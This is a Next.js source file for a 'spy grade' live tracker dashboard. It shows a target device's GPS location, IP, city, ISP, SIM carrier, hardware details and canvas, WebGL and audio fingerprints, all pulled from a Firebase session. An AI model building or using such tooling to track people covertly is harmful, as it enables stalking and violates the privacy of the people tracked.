/**
 * ██████████████████████████████████████████████████████████████
 * TRACKER PAGE – LIVE SESSION VIEW (v5.1 – ULTRA SPY GRADE)
 * 
 * ✅ Fully updated for deviceDetector.ts v5.1
 * ✅ Shows ALL spy-grade data: fingerprints, HDR, GPU, system prefs, PWA, etc.
 * ✅ Beautiful, organized, modern dashboard
 * ✅ Perfect Mobile SIM vs WiFi ISP logic
 * ✅ No TypeScript errors
 * ██████████████████████████████████████████████████████████████
 */

"use client";

import { useEffect, useState } from "react";
import { useParams } from "next/navigation";
import { db } from "@/lib/firebase";
import { ref, onValue } from "firebase/database";
import dynamic from "next/dynamic";
import { DeviceInfo } from "@/lib/deviceDetector";

const LiveMap = dynamic(() => import("@/components/LiveMap"), { ssr: false });

/* ---------------- TYPES ---------------- */

type Pos = {
  lat: number;
  lng: number;
};

type BatteryInfo = {
  level?: number;
  charging?: boolean;
};

type IPInfo = {
  ip?: string;
  city?: string;
  region?: string;
  country?: string;
  isp?: string;
  as?: string;
};

type NetworkInfo = {
  type?: string;
  downlink?: number;
  rtt?: number;
  isp?: string;
  ipInfo?: IPInfo;
};

type SimInfo = {
  carrier?: string;
  confidence?: number;
  method?: string;
};

type SessionData = {
  lat?: number;
  lng?: number;
  status?: "online" | "offline";
  lastSeen?: number;
  timestamp?: number;
  pingMs?: number;
  accuracy?: number;
  device?: DeviceInfo;
  battery?: BatteryInfo;
  network?: NetworkInfo;
  sim?: SimInfo;
};

/* ---------------- PAGE ---------------- */

export default function TrackPage() {
  const { id } = useParams() as { id: string };

  const [pos, setPos] = useState<Pos | null>(null);
  const [status, setStatus] = useState<"online" | "offline" | "loading">("loading");

  const [lastSeen, setLastSeen] = useState<number | null>(null);
  const [ping, setPing] = useState<number | null>(null);
  const [accuracy, setAccuracy] = useState<number | null>(null);

  const [device, setDevice] = useState<DeviceInfo | null>(null);
  const [battery, setBattery] = useState<BatteryInfo | null>(null);
  const [network, setNetwork] = useState<NetworkInfo | null>(null);
  const [sim, setSim] = useState<SimInfo | null>(null);

  /* ---------------- FIREBASE LISTENER ---------------- */
  useEffect(() => {
    if (!id) return;

    const sessionRef = ref(db, `sessions/${id}`);

    const unsubscribe = onValue(sessionRef, (snap) => {
      const data = snap.val() as SessionData | null;

      if (!data) {
        setStatus("offline");
        setPos(null);
        return;
      }

      if (typeof data.lat === "number" && typeof data.lng === "number") {
        setPos({ lat: data.lat, lng: data.lng });
      }

      const last = data.lastSeen ?? data.timestamp ?? null;
      if (typeof last === "number") setLastSeen(last);

      if (typeof data.pingMs === "number") setPing(data.pingMs);
      if (typeof data.accuracy === "number") setAccuracy(data.accuracy);

      setDevice(data.device ?? null);
      setBattery(data.battery ?? null);
      setNetwork(data.network ?? null);
      setSim(data.sim ?? null);

      const now = Date.now();
      const lastTime = typeof last === "number" ? last : 0;
      const isOffline = data.status === "offline" || now - lastTime > 30000;

      setStatus(isOffline ? "offline" : "online");
    });

    return () => unsubscribe();
  }, [id]);

  /* ---------------- HELPERS ---------------- */
  const ipInfo = network?.ipInfo ?? null;
  const displayIsp = network?.isp || ipInfo?.isp || "Detecting...";

  const getStrength = () => {
    if (status !== "online") return 0;
    let score = 100;

    if (ping !== null) {
      if (ping > 500) score -= 60;
      else if (ping > 300) score -= 45;
      else if (ping > 150) score -= 25;
      else if (ping > 80) score -= 10;
    }
    if (accuracy !== null) {
      if (accuracy > 200) score -= 50;
      else if (accuracy > 100) score -= 30;
      else if (accuracy > 50) score -= 15;
    }
    if (lastSeen) {
      const diff = Date.now() - lastSeen;
      if (diff > 20000) score -= 30;
      if (diff > 40000) score -= 50;
    }
    return Math.max(0, Math.min(100, score));
  };

  const strength = getStrength();

  const formatLastSeen = () => {
    if (!lastSeen) return "—";
    const diff = Date.now() - lastSeen;
    const sec = Math.floor(diff / 1000);
    if (sec < 10) return "just now";
    if (sec < 60) return `${sec}s ago`;
    if (sec < 3600) return `${Math.floor(sec / 60)} min ago`;
    return `${Math.floor(sec / 3600)} hr ago`;
  };

  const copySessionLink = () => {
    navigator.clipboard.writeText(`${window.location.origin}/track/${id}`);
    alert("✅ Session link copied to clipboard!");
  };

  /* ---------------- LOADING STATE ---------------- */
  if (!pos) {
    return (
      <div style={styles.loading}>
        <h2>📡 Waiting for location data...</h2>
        <p style={{ marginTop: 8, opacity: 0.7 }}>Session ID: <strong>{id}</strong></p>
        <p style={{ marginTop: 20, fontSize: 15, maxWidth: 320 }}>
          Make sure the Sender is open on the target device
        </p>
      </div>
    );
  }

  /* ---------------- MAIN UI ---------------- */
  return (
    <div style={styles.page}>
      {/* LEFT PANEL – MAP + QUICK STATS */}
      <div style={styles.leftPanel}>
        <div style={styles.mapBox}>
          <LiveMap lat={pos.lat} lng={pos.lng} />
        </div>

        <div style={styles.infoStack}>
          <div style={styles.card}>
            <p>Status</p>
            <h3 style={{ color: status === "online" ? "#22c55e" : "#ef4444", fontSize: 22 }}>
              {status.toUpperCase()}
            </h3>
          </div>

          <div style={styles.card}>
            <p>Connection Strength</p>
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <h3 style={{ color: strength > 70 ? "#22c55e" : strength > 40 ? "#eab308" : "#ef4444" }}>
                {strength}%
              </h3>
              <div style={styles.strengthBar}>
                <div style={{ ...styles.strengthFill, width: `${strength}%` }} />
              </div>
            </div>
          </div>

          <div style={styles.card}>
            <p>Last Seen</p>
            <h3>{formatLastSeen()}</h3>
          </div>

          <div style={styles.card}>
            <p>Ping</p>
            <h3>{ping !== null ? `${ping} ms` : "—"}</h3>
          </div>

          <div style={styles.card}>
            <p>GPS Accuracy</p>
            <h3>{accuracy !== null ? `±${Math.round(accuracy)}m` : "—"}</h3>
          </div>

          <button onClick={copySessionLink} style={styles.copyButton}>
            📋 Copy Shareable Link
          </button>
        </div>
      </div>

      {/* RIGHT PANEL – FULL DASHBOARD */}
      <div style={styles.rightPanel}>
        <h2>🕵️‍♂️ Ultra Spy Tracker Dashboard</h2>
        <p style={{ opacity: 0.6, marginBottom: 24 }}>Session ID: <strong>{id}</strong></p>

        {/* 1. DEVICE INFO – MAXIMUM DETAIL */}
        <div style={styles.cardRight}>
          <h3>📱 Device Info (Spy Grade)</h3>
          {device ? (
            <div style={styles.grid}>
              {/* Basic */}
              <div>
                <strong>Brand / Model</strong>
                <p style={{ fontSize: 19, fontWeight: 700 }}>
                  {device.brand} {device.model}
                </p>
              </div>
              <div>
                <strong>OS</strong>
                <p>{device.os} {device.osVersion || ""}</p>
              </div>
              <div>
                <strong>Browser</strong>
                <p>{device.browser}</p>
              </div>
              <div>
                <strong>Type</strong>
                <p>{device.type}</p>
              </div>

              {/* Hardware */}
              <div style={styles.subSection}>
                <strong>Hardware</strong>
                <p>CPU Cores: {device.cpuCores || "—"}</p>
                <p>RAM: {device.ramGB ? `${device.ramGB} GB` : "—"}</p>
                {device.cpuModelHint && <p>CPU: {device.cpuModelHint}</p>}
              </div>

              {/* GPU */}
              {(device.webGLVendor || device.webGLRenderer) && (
                <div style={styles.subSection}>
                  <strong>GPU (WebGL)</strong>
                  <p style={{ fontSize: 13, wordBreak: "break-all" }}>
                    {device.webGLVendor}<br />
                    {device.webGLRenderer}
                  </p>
                </div>
              )}

              {/* Display */}
              <div style={styles.subSection}>
                <strong>Display</strong>
                <p>
                  {device.screenWidth} × {device.screenHeight} • {device.pixelRatio}x
                </p>
                <p>Avail: {device.availWidth} × {device.availHeight}</p>
                <p>Orientation: {device.orientation}</p>
                <p>Color Gamut: {device.colorGamut} {device.isHDR ? "(HDR)" : ""}</p>
              </div>

              {/* Touch & Mobile */}
              <div style={styles.subSection}>
                <strong>Input</strong>
                <p>Touch Points: {device.touchPoints}</p>
                <p>Touch Device: {device.isTouchDevice ? "Yes" : "No"}</p>
                <p>Standalone / PWA: {device.isStandalone ? "Yes" : "No"}</p>
                <p>Mobile App Mode: {device.isMobileApp ? "Yes" : "No"}</p>
              </div>

              {/* System Preferences */}
              <div style={styles.subSection}>
                <strong>System Preferences</strong>
                <p>Language: {device.language}</p>
                <p>Languages: {device.languages?.join(", ")}</p>
                <p>Timezone: {device.timezone}</p>
                <p>Dark Mode: {device.darkMode ? "Enabled" : "Disabled"}</p>
                <p>Reduced Motion: {device.prefersReducedMotion ? "Yes" : "No"}</p>
                <p>Reduced Data: {device.prefersReducedData ? "Yes" : "No"}</p>
                <p>High Contrast: {device.prefersContrast}</p>
              </div>

              {/* Fingerprints (Ultra Spy) */}
              <div style={styles.subSection}>
                <strong>🔑 Fingerprints</strong>
                {device.canvasFingerprint && <p>Canvas: <span style={{ fontFamily: "monospace", fontSize: 13 }}>{device.canvasFingerprint}</span></p>}
                {device.webglFingerprint && <p>WebGL: <span style={{ fontFamily: "monospace", fontSize: 13 }}>{device.webglFingerprint}</span></p>}
                {device.audioFingerprint && <p>Audio: <span style={{ fontFamily: "monospace", fontSize: 13 }}>{device.audioFingerprint}</span></p>}
              </div>
            </div>
          ) : (
            <p>Loading device details...</p>
          )}
        </div>

        {/* 2. NETWORK + ISP */}
        <div style={styles.cardRight}>
          <h3>🌐 Network & ISP</h3>
          {network ? (
            <>
              <p>Connection: <strong>{network.type || "unknown"}</strong> • {network.downlink ?? "?"} Mbps</p>
              <p>RTT: {network.rtt ?? "?"} ms</p>

              <div style={styles.subSection}>
                <strong>🌍 ISP Details</strong>
                <p><strong>ISP:</strong> {displayIsp}</p>
                <p><strong>IP:</strong> {ipInfo?.ip || "—"}</p>
                <p><strong>City:</strong> {ipInfo?.city || "—"}</p>
                <p><strong>Region:</strong> {ipInfo?.region || "—"}</p>
                <p><strong>Country:</strong> {ipInfo?.country || "—"}</p>
              </div>
            </>
          ) : (
            <p>Loading network info...</p>
          )}
        </div>

        {/* 3. INTERNET PROVIDER (SIM or WiFi) */}
        <div style={styles.cardRight}>
          <h3>📶 Internet Provider</h3>
          {sim && sim.carrier ? (
            <>
              <p style={{ fontSize: 26, fontWeight: 700, marginBottom: 6 }}>
                {sim.carrier}
              </p>

              <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                <div style={{
                  background: (sim.confidence ?? 0) > 60 ? "#22c55e" : (sim.confidence ?? 0) > 40 ? "#eab308" : "#ef4444",
                  color: "white",
                  padding: "6px 16px",
                  borderRadius: 9999,
                  fontSize: 15,
                  fontWeight: 700
                }}>
                  {sim.confidence}% Confidence
                </div>
              </div>

              {sim.method && (
                <p style={{ marginTop: 16, fontSize: 14, opacity: 0.8, fontFamily: "monospace" }}>
                  {sim.method}
                </p>
              )}

              <div style={styles.subSection}>
                <p style={{ fontSize: 14, lineHeight: 1.4 }}>
                  {sim.method?.includes("wifi")
                    ? "📶 Connected via WiFi → showing broadband ISP name"
                    : "📱 Connected via Mobile Data → showing SIM carrier"}
                </p>
              </div>
            </>
          ) : (
            <p>Waiting for provider detection...</p>
          )}
        </div>
      </div>
    </div>
  );
}

/* ---------------- STYLES ---------------- */
const styles: Record<string, React.CSSProperties> = {
  page: {
    display: "flex",
    height: "100vh",
    background: "#0b1220",
    color: "white",
    padding: 16,
    gap: 20,
    fontFamily: "system-ui, sans-serif",
  },
  leftPanel: {
    width: 380,
    display: "flex",
    flexDirection: "column",
    gap: 12,
  },
  mapBox: {
    width: 380,
    height: 380,
    borderRadius: 20,
    overflow: "hidden",
    border: "2px solid #1f2937",
    boxShadow: "0 10px 30px rgba(0,0,0,0.3)",
  },
  infoStack: {
    display: "flex",
    flexDirection: "column",
    gap: 10,
  },
  card: {
    padding: 16,
    borderRadius: 16,
    background: "#1f2937",
    boxShadow: "0 4px 15px rgba(0,0,0,0.2)",
  },
  strengthBar: {
    flex: 1,
    height: 12,
    background: "#334155",
    borderRadius: 9999,
    overflow: "hidden",
  },
  strengthFill: {
    height: "100%",
    background: "linear-gradient(90deg, #22c55e, #eab308)",
    transition: "width 0.4s ease",
  },
  copyButton: {
    padding: "14px 20px",
    background: "#22c55e",
    color: "white",
    border: "none",
    borderRadius: 9999,
    fontWeight: 600,
    cursor: "pointer",
    fontSize: 15,
  },
  rightPanel: {
    flex: 1,
    padding: 28,
    background: "#111827",
    borderRadius: 24,
    overflowY: "auto",
    boxShadow: "0 10px 40px rgba(0,0,0,0.4)",
  },
  cardRight: {
    marginTop: 24,
    padding: 22,
    borderRadius: 20,
    background: "#1f2937",
  },
  subSection: {
    marginTop: 18,
    paddingTop: 18,
    borderTop: "1px solid #374151",
  },
  grid: {
    display: "grid",
    gridTemplateColumns: "1fr 1fr",
    gap: 16,
    fontSize: 15,
  },
  loading: {
    height: "100vh",
    display: "flex",
    alignItems: "center",
    justifyContent: "center",
    flexDirection: "column",
    background: "#0b1220",
    color: "white",
    textAlign: "center",
  },
};